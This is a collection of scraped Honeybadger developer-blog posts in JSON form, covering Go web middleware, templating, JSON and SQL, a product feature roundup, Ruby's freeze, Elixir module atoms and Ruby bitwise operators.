{"website": "Honey-Badger", "title": "Web Development in Go: Middleware, Templating, Databases & Beyond", "author": ["Ayooluwa Isaiah"], "link": "https://www.honeybadger.io/blog/ruby-to-go-4/", "abstract": "In the previous article in this series, we had an extensive discussion on the Go net/http package and how it can be used for production-ready web applications.\nWe focused mostly on the routing aspect and other quirks and features of the http.ServeMux type. This article will close out the discussion on ServeMux by demonstrating how\nmiddleware functions can be implemented with the default router and introducing\nother standard library packages that are sure to come in handy when developing\nweb services with Go. Middleware in Go The practice of setting up shared functionality that needs to run for many or\nall HTTP requests is called middleware . Some operations, such as authentication,\nlogging, and cookie validation, are often implemented as middleware functions,\nwhich act on a request independently before or after the regular route handlers. To implement middleware in Go, you need to make sure you have a type that\nsatisfies the http.Handler interface.\nOrdinarily, this means that you need to attach a method with the signature ServeHTTP(http.ResponseWriter, *http.Request) to the type. When using this\nmethod, any type will satisfy the http.Handler interface. Here's a simple example: package main import \"net/http\" type helloHandler struct { name string } func ( h helloHandler ) ServeHTTP ( w http . ResponseWriter , r * http . Request ) { w . Write ([] byte ( \"Hello \" + h . name )) } func main () { mux := http . NewServeMux () helloJohn := helloHandler { name : \"John\" } mux . Handle ( \"/john\" , helloJohn ) http . ListenAndServe ( \":8080\" , mux ) } Any request sent to the /john route will be passed straight to the helloHandler.ServeHTTP method. You can observe this in action by starting the\nserver and heading to http://localhost:8080/john. Having to add the ServeHTTP method to a custom type every time you want to\nimplement an http.Handler would be quite tedious, so the net/http package\nprovides the http.HandlerFunc type, which allows the use of ordinary functions\nas HTTP handlers. All you need to do is ensure that your function has the following signature: func(http.ResponseWriter, *http.Request) ; then, convert it to the http.HandlerFunc type. package main import \"net/http\" func helloJohnHandler ( w http . ResponseWriter , r * http . Request ) { w . Write ([] byte ( \"Hello John\" )) } func main () { mux := http . NewServeMux () mux . Handle ( \"/john\" , http . HandlerFunc ( helloJohnHandler )) http . ListenAndServe ( \":8080\" , mux ) } You can even replace the mux.Handle line in the main function above with mux.HandleFunc and pass the function to it directly. We used this pattern\nexclusively in the previous article. func main () { mux := http . NewServeMux () mux . HandleFunc ( \"/john\" , helloJohnHandler ) http . ListenAndServe ( \":8080\" , mux ) } At this point, the name is hardcoded into the string, unlike before when we were\nable to set the name in the main function before calling the handler. To\nremove this limitation, we can put our handler logic into a closure, as shown\nbelow: package main import \"net/http\" func helloHandler ( name string ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { w . Write ([] byte ( \"Hello \" + name )) }) } func main () { mux := http . NewServeMux () mux . Handle ( \"/john\" , helloHandler ( \"John\" )) http . ListenAndServe ( \":8080\" , mux ) } The helloHandler function itself does not satisfy the http.Handler interface, but it creates and returns an anonymous function that does. This\nfunction closes over the name parameter, which means it can access it\nwhenever it is called. At this point, the helloHandler function can be reused\nfor as many different names as necessary. So, what does all this have to do with middleware? Well, creating a middleware\nfunction is done in the same way as we've seen above. Instead of\npassing a string to the closure (as in the example), we could pass the\nnext handler in the chain as an argument. Here's the complete pattern: func middleware ( next http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { // Middleware logic goes here... next . ServeHTTP ( w , r ) }) } The middleware function above accepts a handler and returns a handler.\nNotice how we're able to make the anonymous function satisfy the http.Handler interface by casting it to an http.HandlerFunc type. At the end of the\nanonymous function, control is transferred to the next handler by invoking the ServeHTTP() method. If you need to pass values between handlers, such as the\nID of an authenticated user, you can use the http.Request.Context() method\nintroduced in Go 1.7. Let's write a middleware function that simply demonstrates this pattern. This\nfunction adds a property called requestTime to the request object, which is\nsubsequently utilized by helloHandler to display the timestamp of a request. package main import ( \"context\" \"net/http\" \"time\" ) func requestTime ( next http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { ctx := r . Context () ctx = context . WithValue ( ctx , \"requestTime\" , time . Now () . Format ( time . RFC3339 )) r = r . WithContext ( ctx ) next . ServeHTTP ( w , r ) }) } func helloHandler ( name string ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { responseText := \"<h1>Hello \" + name + \"</h1>\" if requestTime := r . Context () . Value ( \"requestTime\" ); requestTime != nil { if str , ok := requestTime . ( string ); ok { responseText = responseText + \" \\n <small>Generated at: \" + str + \"</small>\" } } w . Write ([] byte ( responseText )) }) } func main () { mux := http . NewServeMux () mux . Handle ( \"/john\" , requestTime ( helloHandler ( \"John\" ))) http . ListenAndServe ( \":8080\" , mux ) } Since our middleware function accepts and returns an http.Handler type, it is\npossible to create an infinite chain of middleware functions nested inside each\nother. For example, mux := http . NewServeMux () mux . Handle ( \"/\" , middleware1 ( middleware2 ( appHandler ))) You can use a library like Alice to\ntransform the above construct to a more readable form such as: alice . New ( middleware1 , middleware2 ) . Then ( appHandler ) Templating Although the use of templates has waned with the advent of single-page\napplications, it remains an important aspect of a complete web development\nsolution. Go provides two packages for all your templating needs: text/template and html/template . Both of them have the same interface, but the latter will\ndo some encoding behind the scenes to guard against code injection exploits. Although Go templates aren't the most expressive out there, they get the job\ndone just fine and can be used for production applications. In fact, it's what\nHugo, the popular static site generator, bases its templating system on. Let's take a quick look at how the html/template package may be used to send\nHTML output as a response to a web request. Creating a template Create an index.html file in the same directory as your main.go file and\nadd the following code to the file: <ul> {{ range .TodoItems }} <li> {{ . }} </li> {{ end }} </ul> Next, add the following code to your main.go file: package main import ( \"html/template\" \"log\" \"os\" ) func main () { t , err := template . ParseFiles ( \"index.html\" ) if err != nil { log . Fatal ( err ) } todos := [] string { \"Watch TV\" , \"Do homework\" , \"Play games\" , \"Read\" } err = t . Execute ( os . Stdout , todos ) if err != nil { log . Fatal ( err ) } } If you execute the above program with go run main.go . You should see the\nfollowing output: <ul> <li> Watch TV </li> <li> Do homework </li> <li> Play games </li> <li> Read </li> </ul> Congratulations! You just created your first Go template. Here's a short\nexplanation of the syntax we used in the template file: Go uses double braces ( {{ and }} ) to delimit data evaluation and control\nstructures (known as actions ) in templates. The range action is how we're able to iterate over data structures, such as slices. . represents the current context. In the range action, the current context\nis the slice of todos . Inside the block, {{ . }} refers to each element in\nthe slice. In the main.go file, the template.ParseFiles method is used to create a new\ntemplate from one or more files. This template is subsequently executed using\nthe template.Execute method; it takes an io.Writer and the data, which will\nbe applied to the template. In the above example, the template is executed to the standard output, but we\ncan execute it to any destination, as long as it satisfies the io.Writer interface. For example, if you want to return the output as part of a web\nrequest, all you need to do is execute the template to the ResponseWriter interface, as shown below. package main import ( \"html/template\" \"log\" \"net/http\" ) func main () { t , err := template . ParseFiles ( \"index.html\" ) if err != nil { log . Fatal ( err ) } todos := [] string { \"Watch TV\" , \"Do homework\" , \"Play games\" , \"Read\" } http . HandleFunc ( \"/todos\" , func ( w http . ResponseWriter , r * http . Request ) { w . Header () . Set ( \"Content-Type\" , \"text/html\" ) err = t . Execute ( w , todos ) if err != nil { http . Error ( w , err . Error (), http . StatusInternalServerError ) } }) http . ListenAndServe ( \":8080\" , nil ) } This section is only meant to be a quick intro to Go’s template packages. Make\nsure to check out the documentation for the text/template and html/template if you’re interested in\nmore complex use cases. If you're not a fan of how Go does its templating, alternatives exist, such as\nthe Plush library . Working with JSON If you need to work with JSON objects, you will be pleased to hear that Go's\nstandard library includes everything you need to parse and encode JSON through\nthe encoding/json package. Default types When encoding or decoding a JSON object in Go, the following types are used: bool for JSON booleans, float64 for JSON numbers, string for JSON strings, nil for JSON null, map[string]interface{} for JSON objects, and []interface{} for JSON arrays. Encoding To encode a data structure as JSON, the json.Marshal function is used. Here's\nan example: package main import ( \"encoding/json\" \"fmt\" ) type Person struct { FirstName string LastName string Age int email string } func main () { p := Person { FirstName : \"Abraham\" , LastName : \"Freeman\" , Age : 100 , email : \"abraham.freeman@hey.com\" , } json , err := json . Marshal ( p ) if err != nil { fmt . Println ( err ) return } fmt . Println ( string ( json )) } In the above program, we have a Person struct with four different fields. In\nthe main function, an instance of Person is created with all the fields\ninitialized. The json.Marshal method is then used to convert the p structure\nto JSON. This method returns a slice of bytes or an error, which we have to\nhandle before accessing the JSON data. To convert a slice of bytes to a string in Go, we need to perform type\nconversion, as demonstrated above. Running this\nprogram will produce the following\noutput: {\"FirstName\":\"Abraham\",\"LastName\":\"Freeman\",\"Age\":100} As you can see, we get a valid JSON object that can be used in any way we\nwant. Note that the email field is left out of the result. This is because\nit is not exported from the Person object by virtue of starting with a\nlowercase letter. By default, Go uses the same property names in the struct as field names in the\nresulting JSON object. However, this can be changed through the use of struct\nfield tags. type Person struct { FirstName string `json:\"first_name\"` LastName string `json:\"last_name\"` Age int `json:\"age\"` email string `json:\"email\"` } The struct field tags above specify that the JSON encoder should map the FirstName property in the struct to a first_name field in the JSON object\nand so on. This change in the previous example produces the following output: {\"first_name\":\"Abraham\",\"last_name\":\"Freeman\",\"age\":100} Decoding The json.Unmarshal function is used for decoding a JSON object into a Go\nstruct. It has the following signature: func Unmarshal ( data [] byte , v interface {}) error It accepts a byte slice of JSON data and a place to store the decoded data. If\nthe decoding is successful, the error returned will be nil . Assuming we have the following JSON object, json := \"{\" first_name \":\" John \",\" last_name \":\" Smith \",\" age \":35, \" place_of_birth \": \" London \", gender:\" male \"}\" We can decode it to an instance of the Person struct, as shown below: func main () { b := `{\"first_name\":\"John\",\"last_name\":\"Smith\",\"age\":35, \"place_of_birth\": \"London\", \"gender\":\"male\", \"email\": \"john.smith@hmail.com\"}` var p Person err := json . Unmarshal ([] byte ( b ), & p ) if err != nil { fmt . Println ( err ) return } fmt . Printf ( \"%+v \\n \" , p ) } And you get the following output: {FirstName:John LastName:Smith Age:35 email:} Unmarshal only decodes fields that are found in the destination type. In\nthis case, place_of_birth and gender are ignored since they do not map to\nany struct field in Person . This behavior can be leveraged to pick only\na few specific fields out of a large JSON object. As before, unexported fields\nin the destination struct are unaffected even if they have a corresponding\nfield in the JSON object. That's why email remains an empty string in the\noutput even though it is present in the JSON object. Databases The database/sql package provides a generic interface around SQL (or SQL-like)\ndatabases. It must be used in conjunction with a database driver, such as the\nones listed here . When importing\na database driver, you need to prefix it with an underscore _ to initialize\nit. For example, here's how to use the MySQL\ndriver package with database/sql : import ( \"database/sql\" _ \"github.com/go-sql-driver/mysql\" ) Under the hood, the driver registers itself as being available to the database/sql package, but it won't be used directly in our code. This helps us\nreduce dependency on a specific driver so that it can be easily swapped out\nfor another with minimal effort. Opening a database connection To access a database, you need to create a sql.DB object, as shown below: func main () { db , err := sql . Open ( \"mysql\" , \"user:password@tcp(127.0.0.1:3306)/hello\" ) if err != nil { log . Fatal ( err ) } } The sql.Open method prepares the database abstraction for later use. It does\nnot establish a connection to the database or validate the connection\nparameters. If you want to ensure that the database is available and accessible\nimmediately, use the db.Ping() method: err = db . Ping () if err != nil { log . Fatal ( err ) } Closing a database connection To close a database connection, you can use db.Close() . Normally, you want to defer the closing of the database until the function that opened the database\nconnection ends, usually the main function: func main () { db , err := sql . Open ( \"mysql\" , \"user:password@tcp(127.0.0.1:3306)/hello\" ) if err != nil { log . Fatal ( err ) } defer db . Close () } The sql.DB object is designed to be long-lived, so you should not open and\nclose it frequently. If you do, you may experience problems, such as poor reuse\nand sharing of connections, running out of available network resources, or\nsporadic failures. It's best to pass the sql.DB method around or make it\navailable globally and only close it when the program is done accessing that\ndatastore. Fetching data from the database Querying a table can be done in three steps. First, call db.Query() . Then,\niterate over the rows. Finally, use rows.Scan() to extract each row into\nvariables. Here's an example: var ( id int name string ) rows , err := db . Query ( \"select id, name from users where id = ?\" , 1 ) if err != nil { log . Fatal ( err ) } defer rows . Close () for rows . Next () { err := rows . Scan ( & id , & name ) if err != nil { log . Fatal ( err ) } log . Println ( id , name ) } err = rows . Err () if err != nil { log . Fatal ( err ) } If a query returns a single row, you can use the db.QueryRow method instead of db.Query and avoid some of the lengthy boilerplate code in the previous code\nsnippet: var ( id int name string ) err = db . QueryRow ( \"select id, name from users where id = ?\" , 1 ) . Scan ( & id , & name ) if err != nil { log . Fatal ( err ) } fmt . Println ( id , name ) NoSQL databases Go also has good support for NoSQL databases, such as Redis, MongoDB, Cassandra,\nand the like, but it does not provide a standard interface for working with\nthem. You'll have to rely entirely on the driver package for the specific\ndatabase. Some examples are listed below. https://github.com/go-redis/redis (Redis driver). https://github.com/mongodb/mongo-go-driver (MongoDB driver). https://github.com/gocql/gocql (Cassandra driver). https://github.com/Shopify/sarama (Apache Kafka driver) Wrapping up In this article, we discussed some essential aspects of building web\napplications with Go. You should now be able to understand why many Go\nprogrammers swear by the standard library. It's very comprehensive and provides\nmost of the tools necessary for a production-ready service. If you require clarification on anything we've covered here, please send me a\nmessage on Twitter . In the next and final\narticle in this series, we'll discuss the go tool and how to use it to tackle\ncommon tasks in the course of developing with Go. Thanks for reading, and happy coding!", "date": "2020-12-08"},
{"website": "Honey-Badger", "title": "New features, just in time for summer!", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/2016-summer-features-roundup/", "abstract": "It's summer! Time to go out and catch some rays! While you're out, we at Honeybadger will be happy to keep tabs on your apps. We've recently launched a bunch of new features to make it even easier. Track errors across multiple platforms Have a project you didn’t write in Ruby? The badger has you covered. We've recently added or expanded support for: Python 2.7 with Django PHP with Slim and Composer Support Node.js with Express and Connect That's in addition to our support for Ruby, JavaScript, Elixir, Go and Java. Just like our adorable mascot, the honeybadger, we'll eat whatever errors you throw at us. Fine tune your ops workflow The last thing people want is get alerted about an error when they aren’t on-call or not needed to resolve it. Honeybadger integrates with your favorite incident management tools such as: OpsGenie , notable for its ability to route Honeybadger errors to their platform and notify the right people based on a determined on-call schedule. VictorOps , renowned for its chat platform that enables teams to collaborate and resolve errors quickly. PagerDuty , lauded for...well, you get the idea. :) ..and for you data junkies: DataDog , distinguished for its aggregation of multiple data streams to create one seamless event monitoring app. If you would rather customize your own alerts with existing project management tools like Pivotal Tracker and chat tools like Slack , Honeybadger can help you with that too. We include options to choose which events warrant notification, when to turn on or off the firehose of alerts, and the use of filters to determine which events deserve extra notification. Check out our video on how to customize alerts to your preference. Turn data into action Honeybadger lets you get straight to the source by tying errors to users within your app, as well making it easy to access your error data. Our integration with Intercom has the ability to track events that are triggered by users. These events can be used to segment your users into lists for follow-up or additional messaging. Honeybadger can send the \"Error Encountered\" event to Intercom whenever a logged-in user at your site encounters an error. You can even send out a message to everyone that encountered an error after you deploy a fix. We just released V2 of our READ API, featuring performance upgrades and new endpoints. For more details, check out our blog post . When a logged-in user in your site encounters an error, Honeybadger will send the information to Intercom so you get notified about it before a customer reaches out. Magic! We hope these new features empower you to take your full vacation, guilt free. If you have suggestions on additional integrations or other languages to support, shoot us a line at support@honeybadger.io.", "date": "2016-06-22"},
{"website": "Honey-Badger", "title": "When to use freeze and frozen? in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/when-to-use-freeze-and-frozen-in-ruby/", "abstract": "These days it's pretty common to see #freeze used in Ruby code. But it's often not entirely clear WHY freeze is being used. In this post we'll look at the most common reasons a developer might freeze variables. To illustrate each reason, I've excerpted example code from the Rails codebase and other popular open-source projects. Creating immutable constants In Ruby, constants are mutable. It's a little confusing, but the code is easy enough to understand. Here, I've created a string constant and am appending another string to it. MY_CONSTANT = \"foo\" MY_CONSTANT << \"bar\" puts MY_CONSTANT . inspect # => \"foobar\" By using #freeze, I'm able to create a constant that's actually constant. This time, when I attempt to modify the string, I get a RuntimeError. MY_CONSTANT = \"foo\" . freeze MY_CONSTANT << \"bar\" # => RuntimeError: can't modify frozen string Here' a real-world example of this in the ActionDispatch codebase.  Rails hides sensitive data in logs by replacing it with the text \"[FILTERED]\". This text is stored in a frozen constant. module ActionDispatch module Http class ParameterFilter FILTERED = '[FILTERED]' . freeze ... Reducing object allocations One of the best things you can do to speed up your Ruby app is to decrease the number of objects that are created. One annoying source of object allocations comes from the string literals that are sprinkled throughout most apps. Every time you do a method call like log(\"foobar\"), you create a new String object. If your code calls a method like this thousands of times per second, that means you're creating (and garbage-collecting) thousands of strings per second. That's a lot of overhead! Fortunately, Ruby gives us a way out. If we freeze string literals, the Ruby interpreter will only create one String object and will cache it for future use. I've put together a quick benchmark showing the performance of frozen vs. non-frozen string arguments. It shows around a 50% performance increase. require 'benchmark/ips' def noop ( arg ) end Benchmark . ips do | x | x . report ( \"normal\" ) { noop ( \"foo\" ) } x . report ( \"frozen\" ) { noop ( \"foo\" . freeze ) } end # Results with MRI 2.2.2: # Calculating ------------------------------------- #               normal   152.123k i/100ms #               frozen   167.474k i/100ms # ------------------------------------------------- #               normal      6.158M (± 3.3%) i/s -     30.881M #               frozen      9.312M (± 3.5%) i/s -     46.558M You can see this in action if you look at the Rails router. Since the router is used for every web page request, it needs to be fast. That means a lot of frozen string literals. # excerpted from https://github.com/rails/rails/blob/f91439d848b305a9d8f83c10905e5012180ffa28/actionpack/lib/action_dispatch/journey/router/utils.rb#L15 def self . normalize_path ( path ) path = \"/ #{ path } \" path . squeeze! ( '/' . freeze ) path . sub! ( %r{/+ \\Z } , '' . freeze ) path . gsub! ( /(%[a-f0-9]{2})/ ) { $1 . upcase } path = '/' if path == '' . freeze path end Built-in optimizations in Ruby >= 2.2 Ruby 2.2 and later (MRI) will automatically freeze string literals that are used as hash keys. user = { \"name\" => \"george\" } # In Ruby >= 2.2 user [ \"name\" ] # ...is equivalent to this, in Ruby <= 2.1 user [ \"name\" . freeze ] And according to Matz, all string literals will be frozen automatically in Ruby 3. link: DevelopersMeeting20150820Japan - String literals are frozen (immutable) by default in Ruby 3.0 https://t.co/4XcelftmSa — Yukihiro Matsumoto (@yukihiro_matz) August 20, 2015 Value objects & functional programming While Ruby isn't a functional programming language, many Rubyists have begun to see the value of working in a functional style. One of the main tenets of this style is that you should avoid side effects. Objects should never change after they've been initialized. By calling the freeze method inside the constructor, it's possible to guarantee that an object will never change. Any unintentional side-effects will result in an exception being raised. class Point attr_accessor :x , :y def initialize ( x , y ) @x = x @y = y freeze end def change @x = 3 end end point = Point . new ( 1 , 2 ) point . change # RuntimeError: can't modify frozen Point", "date": "2015-09-02"},
{"website": "Honey-Badger", "title": "Understanding Elixir's Strange Module Names", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/elixir-module-names/", "abstract": "Last week was amazing. It was our first ever Honeybadger Hack Week. We got to take a momentary break from thinking about exceptions and uptime to focus all our energies on something completely new. We decided as a team to build a small app in Elixir and Phoenix. As I was getting comfortable with Elixir, one weird thing began to stand out to me. When you open up the console (iex) and type in a module name, there's never an error. Even when the module doesn't exist. iex> SomeModule\n# => SomeModule This is unlike Ruby, where you'll always get an error: irb> SomeClass\nNameError: uninitialized constant SomeClass It turns out, Elixir handles module names in an unexpected way. It's a little strange, but once you understand the underlying mechanism, it becomes very easy to reason about modules. So pull up a seat. Gather round the fire and let me tell you a story. How other languages handle modules In static languages like Rust, modules only really exist at compile-time. They're used to perform correctness checks, but then they're discarded and aren't present in the compiled object file except perhaps as debug metadata. mod sound { fn guitar () { } } sound :: guitar (); In Ruby, modules and classes are special kinds of objects. Module \"names\" are just variables. They have special CamelCase names, and some special lookup rules, but they're basically just variables. You can even reassign them. module MyModule def self . hello () puts \"world\" end end YourModule = MyModule MyModule = nil YourModule . hello # => \"world\" Elixir's surprising approach At first glance, Elixir looks like Ruby. We can define modules, assign them to variables then call functions as if we were referencing the original. defmodule MyModule do def hello () do IO . puts ( \"world\" ) end end x = MyModule x . hello () # => \"world\" But there is a difference. If you're really paying attention you may have noticed that in the ruby example, we have YourModule = MyModule , while in elixir, we have x = MyModule . That's because elixir gives an error if I try the former: YourModule = MyModule # ** (MatchError) no match of right hand side value: MyModule I can assign a module name to a variable, but the module name itself doesn't seem to be a variable like it is in Ruby. Instead, module names are \"atoms.\" Atoms Atoms are used to name things when you don't want the overhead of using a string. They're very similar to Ruby's \"symbols\": :foo :bar :\"this atom has spaces and.special.chars\" Common uses for atoms are as keys in maps (hashes in Ruby, objects in JavaScript) and to specify keyword arguments in functions: my_map = %{ foo: 1 } my_func ( foo: 1 ) They're also used to name modules. For example, if I want to call Erlang's format function from elixir, I would write something like this: :io . format ( arg1 , arg2 ) Like all Erlang modules, we reference the io module via an atom, :io . Aliases At this point I imagine you're thinking, \"Wait a second! Elixir module names look like MyModule not :my_module ! Those aren't the same!\" That's because Elixir is playing tricks on us. Behind the scenes, it converts any code referring to MyModule to refer to the atom, :\"Elixir.MyModule\" . You can see this in action if you open up iex: MyModule == :\"Elixir.MyModule\" # true The substitution of module name like MyModule with an atom is called \"aliasing.\" It happens automatically for any keyword that looks like a module name: AnythingThatLooksLikeThis . The reason that we reference Erlang modules directly with atom ( :io , etc) is because there's no aliasing involved. Though, if you wanted to you could manually create an alias: alias :io , as: IO IO # => :io Practical Implications Now that we know that \"module names\" in Elixir are just atoms + aliasing, it's easy to reason about modules. First, we see why we got an error when we tried to assign YourModule = MyModule . When expanded, that code becomes: :\"Elixir.YourModule\" = :\"Elixir.MyModule\" # error Assigning one atom to another makes no sense. You might as well try to say 1 = 2 or \"foo\" = \"bar\" . Furthermore, we see that anything that can be done with an atom can also be done with a module name: # Call functions using the atom directly :\"Elixir.MyModule\" . hello () # Construct module names from strings, dynamically. # Probably not a best practice. String . to_atom ( \"Elixir.MyModule\" ) . hello () # Pass a module into an anonymous function ( fn x -> x . hello () end ) . ( MyModule ) # Make a genserver name equal the current module name GenServer . start_link ( Stack , [ :hello ], name: __MODULE__ ) # Execute the same function in a list of modules for mod <- [ MyModule , OtherModule ], do : mod . hello () # Reference a module before it's defined. Just don't run this function if it isn't :) def do_something (), do : SomeOtherModule . something () Conclusion When I first discovered the use of atoms for elixir modules, I wasn't thrilled. It seemed ugly and weird. But I've come around. Atoms are perfect for naming things, including modules. They're fast. They're never garbage-collected. They're unique. And best of all, they're easy to reason about. Like a lot of Erlang, they make a lot of sense once you get over the intitial strangeness.", "date": "2019-01-30"},
{"website": "Honey-Badger", "title": "Ruby's Bitwise Toolbox: Operators, Applications and Magic Tricks", "author": ["José M. Gilgado"], "link": "https://www.honeybadger.io/blog/ruby-bitwise-operators/", "abstract": "You could probably spend your whole life building Rails apps and never need to use any bitwise operators. If you're new to programming, you may not even know what \"bitwise\" means. But the moment you take an interest in systems where efficiency is important and resources are limited, bitwise operations become crucial. They're used extensively with things like networks protocols, cryptography, Unix files permissions and embedded systems. In addition, to really understand how the computer does things like add two numbers, you have to understand bitwise operations. Since Ruby and many other languages have native support, they're a great tool to add to your toolbox, even if it's only to understand what's going on if you encounter them in the future. In this article, we'll cover what bitwise operations are, some examples of where they can be applied and how we can best use them in Ruby. Let's begin. What are bitwise operations? At the lowest level in any computer, we only have 1s and 0s, also known as bits. Any other operation that we use in Ruby or any other programming language is eventually stored as 1s and 0s, but the software in our computers transforms them effectively back and forth between what we see and what's actually stored. For example, we store the string \"hello\" as a chain of 1s and 0s. Bitwise operations allow us to access directly those bits, usually representing numbers, and do \"something\" with them. Some operations will help us in implementing features in our software in a more elegant and efficient way. There are two important aspects to highlight about bitwise operations for now: they're extremely effective in storing information, since we're using bits directly, and they're very fast in execution. The basic behavior is having a set of bits and applying the operator to it. You can also use the operators with two sets of bits. Let's see some operations: NOT bitwise operation This is a unary operation, which means that it only applies to a set of bits and it's as simple as replacing the 1s with 0s and vice versa. It's represented with the symbol: ~ . ~101000 = 010111 AND bitwise operation AND is an operation that applies to two sets of bits; its symbol is & and it follows this logic: 1 & 1 = 1\n1 & 0 = 0\n0 & 1 = 0\n0 & 0 = 0 So when we have two equal-length sets of bits, the result is just applying this logic to each individual pair: 0110 AND\n0111\n-----\n0110 In Ruby: 25 . to_s ( 2 ) # 11001 30 . to_s ( 2 ) # 11110 ( 25 & 30 ). to_s ( 2 ) # 11000 OR bitwise operation Similar to the AND operation, another operation that also applies to two sets of bits is the bitwise OR. Its symbol is | and follows this logic: 1 | 1 = 1\n1 | 0 = 1\n0 | 1 = 1\n0 | 0 = 0 So if we have 1 on either side, the result is 1, otherwise it's 0. Very simple! Let's see an OR operation with more bits: 0110 OR\n0111\n-----\n0111 And in Ruby: 25 . to_s ( 2 ) # 11001 30 . to_s ( 2 ) # 11110 ( 25 | 30 ). to_s ( 2 ) # 11111 Practical example 1: Permissions At this point, you might be wondering why these operations are useful. After all, they seem pretty low-level.  You may not have any plans to work directly with network protocols, graphics or cryptography. But you've probably worked with permissions before. Permissions are one area where bitwise operations can be really useful. Imagine you have a permissions system where users can perform different actions in a document: View Edit Delete Invite other users And now we want to model these actions into different roles: Assistant: can view and edit the document. Observer: can only view the document. Author: can perform all actions. How could we model this? How do we know at any point if a user has one of these roles? One answer is to use bitwise operations. We'd store only one set of bits for each user that represents the permissions they have: (Starting from the right side)\n1st bit: View\n2nd bit: Edit\n3rd bit: Delete\n4th bit: Invite other users For example: 0001 = Can only view the document.\n0011 = Can view and edit the document.\n1001 = Can view, can't edit, can't delete and can invite others. Once we have these values set for some users, we could do some really fast comparisons with the permission we want. Let's imagine we're checking if a user can edit the document. We could use a bitwise AND operation: # This is called a bit mask. It contains only the value we want to check, in this case the second bit for editing. EDIT_PERMISSION_MASK = 0b0010 # We can define a quick method to check this: def can_edit_document? ( user_permisions ) ( EDIT_PERMISSION_MASK & user_permisions ) != 0 end This means that if the bitwise AND operation gives us something different than 0, we have that bit set: 0010 AND\n1101\n----\n0000 == 0 so we don't have the permission\n\n0010 AND\n1110\n----\n0010 != 0 so we have the permission We could apply the same logic to any other permission by modifying the position of the bit that we want to check, so we'd end up with these constant and the corresponding methods: VIEW_PERMISSION_MASK = 0b0001 EDIT_PERMISSION_MASK = 0b0010 DELETE_PERMISSION_MASK = 0b0100 INVITE_PERMISSION_MASK = 0b1000 In addition, we can dynamically define the permissions and store new permissions in the future with a quick bit check. For example, we said earlier that an assistant can only view and edit the document, so the permissions for that user would be: 0011 . We can store that value in our database and then we can easily check if an assistant can perform an action with the methods defined earlier. ASSISTANT_MASK = VIEW_PERMISSION_MASK | EDIT_PERMISSION_MASK # This will be: 0011 # Optionally, we could use this method to check if this user is an assistant. This method could be defined inside the User class. def is_assistant? ( user ) ( user . permissions == ASSISTANT_MASK ) end If all of this sounds familiar, that's because it's the same approach that is commonly used for file permissions in Unix-based systems. Practical example 2: Positions in a team Let's use bitwise operations a bit more 😉. We can apply them in another case that's relatively common: different positions on a sports team or job positions in a company. Let's go with a basketball team to simplify. In basketball, there are 5 positions when playing a game:\n- Point guard\n- Shooting guard\n- Small forward\n- Power forward\n- Center And we can assign a set of bits to each position: 00001 Point guard\n00010 Shooting guard\n00100 Small forward\n01000 Power forward\n10000 Center The same in Ruby would be: POINT_GUARD_POSITION = 0b00001 SHOOTING_GUARD_POSITION = 0b00010 SMALL_FORWARD_POSITION = 0b00100 POWER_FORWARD_POSITION = 0b01000 CENTER_POSITION = 0b10000 POINT_GUARD_POSITION | SHOOTING_GUARD_POSITION | SMALL_FORWARD_POSITION | POWER_FORWARD_POSITION | CENTER_POSITION # = 31 So now we could do some interesting things, like check if the whole team is present with: # p1...p5 are the positions of each player is_full_team_present = ( p1 | p2 | p3 | p4 | p5 == 31 ) Why? By doing the bitwise OR operation, if we had all the positions, we'd end up with: 11111. # OR bitwise operation\n00001 |\n00010 |\n00100 |\n01000 |\n10000\n-----\n11111 And 11111 is 31, because 2^0 + 2^1 + 2^2 + 2^3 + 2^4 = 31. This is not strictly related to bitwise operations, but with this data modeling we could also check if two players can be exchanged. This would be very simple: def can_be_exchanged? ( player1 , player2 ) player1 . position == player2 . position end XOR Another operation we can do with two sets of bits is XOR, whose symbol is ^ . XOR means exclusive OR and it follows this logic: 1 | 1 = 0\n1 | 0 = 1\n0 | 1 = 1\n0 | 0 = 0 So the result will be 1 only if one of the two bits is 1; if both are equal it'll be 0. This operation is used in some algorithms to compare a number to itself, since x ^ x = 0. Shifts This is an interesting group of operations where we \"move\" bits to one side or the other within a set. Let me explain. With a bit shift, we move or \"shift\" the bits in one direction, left or right: 00010111 left-shift\n<-------\n00101110 10010111 right-shift\n------->\n11001011 We can move or shift bits n times. Here's a left shift applied to the number 5 twice in Ruby: 5 . to_s ( 2 ) # 101 ( 5 << 2 ). to_s ( 2 ) # 10100 As you can see, a left shift is represented by <<. A right shift uses >>: 5 . to_s ( 2 ) # 101 ( 5 >> 2 ). to_s ( 2 ) # 1 In this case, we only get one, because the bits \"0\" and \"1\" from 1* 01 * have been discarded. Divide by 2 with right shift One interesting fact about bit shifts is that you can computate some mathematical operations with them. In the past, this was faster, but nowadays this is almost exclusively used by programmers who work with more constraints in resources like in game development. If we apply a right shift to a number, we get the result of dividing it by 2: 10 . to_s ( 2 ) # 1010 ( 10 >> 1 ). to_s ( 2 ) # 101 10 >> 1 # 5 Multiply by 2 with left shift In the same fashion, we can multiply by 2 with a left shift: 10 . to_s ( 2 ) # 1010 ( 10 << 1 ). to_s ( 2 ) # 10100 10 << 1 # 20 Quickly check if a number is odd or even There's a very simple example of a bitwise operation that's really fast and easy to follow. Imagine we do an AND operation with 1, just 1. So that'd be any number of 0s, depending on the computer we're in, and 1. Let's do it with 2: 2 = 00000010 &\n    00000001\n-------------\n    00000000 Now with 4: 4 = 00000100 &\n    00000001\n-------------\n    00000000 What about 5? 5 = 00000101 &\n    00000001\n-------------\n    00000001 Now we got 1. Can you guess what this means? By doing this AND with 1, if the number is even, we'll get 0. If it's odd, we'd get 1. We could easily use this fact to create a couple of methods in Ruby: def is_odd? ( number ) number & 1 end def is_even? ( number ) is_odd? ( number ) == 0 end # Or: def is_even? ( number ) ( number & 1 ) == 0 end If you want to go further, or experience some mind-blowing moments with bits, check out this bitwise hacks collection for more tricks. Conclusion Bitwise operations are hard to follow if you've never encountered them, but once you're familiar with them you'll be better prepared to deal with existing or future projects that use them. Plus, you'll have a new tool when planning a solution for a problem in your code.", "date": "2020-03-10"},
